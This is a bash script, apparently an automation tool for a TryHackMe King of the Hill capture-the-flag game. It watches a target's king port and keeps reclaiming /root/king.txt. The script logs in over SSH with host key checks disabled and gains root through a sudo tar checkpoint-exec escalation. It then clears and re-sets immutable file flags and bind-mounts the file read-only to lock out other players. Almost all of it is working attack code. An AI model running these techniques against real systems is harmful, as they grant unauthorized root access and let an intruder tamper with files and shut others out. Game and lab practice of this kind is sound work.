#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="${CTF_ROOT:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
TARGET="${1:?usage: koth-loss-recover.sh <target_ip> [name] [ssh_user] [ssh_key] [interval_sec] [logfile] [statusfile]}"
NAME="${2:-${OPERATOR_NAME:-operator}}"
SSH_USER="${3:-donkey}"
SSH_KEY="${4:-/tmp/donkey_hold_ed25519}"
INTERVAL="${5:-2}"
LOGFILE="${6:-$ROOT_DIR/challenges/tryhackme/koth/loss_recover_${TARGET}.log}"
STATUSFILE="${7:-$ROOT_DIR/challenges/tryhackme/koth/koth_status_${TARGET}.json}"

mkdir -p "$(dirname "$LOGFILE")"
mkdir -p "$(dirname "$STATUSFILE")"

log() {
  local msg="$1"
  printf '%s %s\n' "$(date '+%F %T')" "$msg" | tee -a "$LOGFILE"
}

unknown=0
recovery_attempt_active=0
last_reclaim_status="idle"
last_reclaim_output=""

write_status() {
  local ts="$1"
  local state="$2"
  local cur="$3"
  python3 - "$STATUSFILE" "$LOGFILE" "$TARGET" "$NAME" "$SSH_USER" "$ts" "$state" "$cur" "$claims" "$losses" "$unknown" "$recovery_attempt_active" "$last_reclaim_status" "$last_reclaim_output" <<'PY'
import json, os, sys

(
    statusfile,
    logfile,
    target,
    desired_holder,
    ssh_user,
    ts,
    state,
    observed_holder,
    claims,
    losses,
    unknown,
    recovery_attempt_active,
    last_reclaim_status,
    last_reclaim_output,
) = sys.argv[1:]
needs_retake = state in {"LOSS", "OTHER", "REGAIN_FAIL", "RECLAIMING"}
data = {
    "target": target,
    "desired_holder": desired_holder,
    "ssh_user": ssh_user,
    "ts": ts,
    "state": state,
    "observed_holder": observed_holder,
    "claims": int(claims),
    "losses": int(losses),
    "unknown": int(unknown),
    "needs_retake": needs_retake,
    "recovery_mode": True,
    "recovery_attempt_active": recovery_attempt_active == "1",
    "last_reclaim_status": last_reclaim_status,
    "last_reclaim_output": last_reclaim_output,
    "source": "loss-recover",
    "logfile": logfile,
}
tmp = statusfile + ".tmp"
with open(tmp, "w", encoding="utf-8") as fh:
    json.dump(data, fh, indent=2, sort_keys=True)
    fh.write("\n")
os.replace(tmp, statusfile)
PY
}

ssh_base=(
  ssh
  -i "$SSH_KEY"
  -o StrictHostKeyChecking=no
  -o UserKnownHostsFile=/dev/null
  -o ConnectTimeout=5
  "${SSH_USER}@${TARGET}"
)

stage_remote() {
  "${ssh_base[@]}" "cat > /tmp/reclaim_king.py <<'PY'
#!/usr/bin/env python3
import fcntl, os, struct, sys
king='/root/king.txt'
name=os.environ.get('KH_NAME','operator') + '\\n'
FS_IOC_GETFLAGS=0x80086601
FS_IOC_SETFLAGS=0x40086602
FS_IMMUTABLE_FL=0x00000010
FS_APPEND_FL=0x00000020

def get_flags(fd):
    b=bytearray(4)
    fcntl.ioctl(fd, FS_IOC_GETFLAGS, b, True)
    return struct.unpack('I', b)[0]

target = king
try:
    st = os.popen(\"findmnt -T /root/king.txt -no SOURCE 2>/dev/null\").read().strip()
    if '[' in st and st.endswith(']'):
        target = st.split('[', 1)[1][:-1]
except Exception:
    pass

fd=os.open(target, os.O_RDWR)
flags=get_flags(fd)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('I', flags & ~(FS_IMMUTABLE_FL | FS_APPEND_FL)))
os.lseek(fd, 0, os.SEEK_SET)
os.write(fd, name.encode())
os.ftruncate(fd, len(name))
os.fsync(fd)
new_flags=get_flags(fd) | FS_IMMUTABLE_FL | FS_APPEND_FL
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('I', new_flags))
os.close(fd)
if target != king:
    os.system(f'mount --bind {target} {king} >/dev/null 2>&1 || true')
    os.system(f'mount -o remount,bind,ro {king} >/dev/null 2>&1 || true')
open('/tmp/.kh_reclaim_flags','w').write(f'target={target} old=0x{flags:08x} final=0x{new_flags:08x}\\n')
PY
chmod +x /tmp/reclaim_king.py

cat > /tmp/reclaim_root.sh <<'SH'
#!/bin/bash
set +e
python3 /tmp/reclaim_king.py >/tmp/.kh_reclaim_out 2>/tmp/.kh_reclaim_err
cat /root/king.txt >/tmp/.kh_king_now 2>/tmp/.kh_king_err
SH
chmod +x /tmp/reclaim_root.sh
"
}

reclaim_once() {
  local out
  recovery_attempt_active=1
  last_reclaim_status="reclaiming"
  write_status "$(date '+%F %T')" "RECLAIMING" "${last:-ERR}"
  if [[ "$SSH_USER" == "root" ]]; then
    out=$("${ssh_base[@]}" "KH_NAME='${NAME}' /bin/bash /tmp/reclaim_root.sh; cat /tmp/.kh_reclaim_flags /tmp/.kh_reclaim_out /tmp/.kh_reclaim_err /tmp/.kh_king_now 2>/dev/null | tr '\n' ' '" || true)
  else
    out=$("${ssh_base[@]}" "KH_NAME='${NAME}' sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/bash /tmp/reclaim_root.sh'; cat /tmp/.kh_reclaim_flags /tmp/.kh_reclaim_out /tmp/.kh_reclaim_err /tmp/.kh_king_now 2>/dev/null | tr '\n' ' '" || true)
  fi
  last_reclaim_output="${out:-no_output}"
  log "reclaim_result ${out:-no_output}"
}

current_king() {
  curl -sS --max-time 3 "http://${TARGET}:9999/" 2>/dev/null | tr -d '\r\n' || true
}

log "watch_start target=$TARGET name=$NAME user=$SSH_USER interval=${INTERVAL}s"
stage_remote

claims=0
losses=0
last=""

while true; do
  cur="$(current_king)"
  if [[ -z "$cur" ]]; then
    ((unknown+=1)) || true
    log "state=UNKNOWN king=ERR claims=$claims losses=$losses"
    write_status "$(date '+%F %T')" "UNKNOWN" "ERR"
  elif [[ "$cur" == "$NAME" ]]; then
    recovery_attempt_active=0
    last_reclaim_status="idle"
    if [[ "$last" != "$NAME" ]]; then
      ((claims+=1)) || true
      log "state=CLAIM king=$cur claims=$claims losses=$losses"
      write_status "$(date '+%F %T')" "CLAIM" "$cur"
    else
      log "state=HOLD king=$cur claims=$claims losses=$losses"
      write_status "$(date '+%F %T')" "HOLD" "$cur"
    fi
  else
    ((losses+=1)) || true
    log "state=LOSS king=$cur claims=$claims losses=$losses"
    last_reclaim_status="loss_detected"
    write_status "$(date '+%F %T')" "LOSS" "$cur"
    reclaim_once
    sleep 1
    post="$(current_king)"
    if [[ "$post" == "$NAME" ]]; then
      ((claims+=1)) || true
      recovery_attempt_active=0
      last_reclaim_status="regained"
      log "state=REGAIN king=$post claims=$claims losses=$losses"
      write_status "$(date '+%F %T')" "REGAIN" "$post"
    else
      recovery_attempt_active=0
      last_reclaim_status="regain_fail"
      log "state=REGAIN_FAIL king=${post:-ERR} claims=$claims losses=$losses"
      write_status "$(date '+%F %T')" "REGAIN_FAIL" "${post:-ERR}"
    fi
  fi
  last="$cur"
  sleep "$INTERVAL"
done
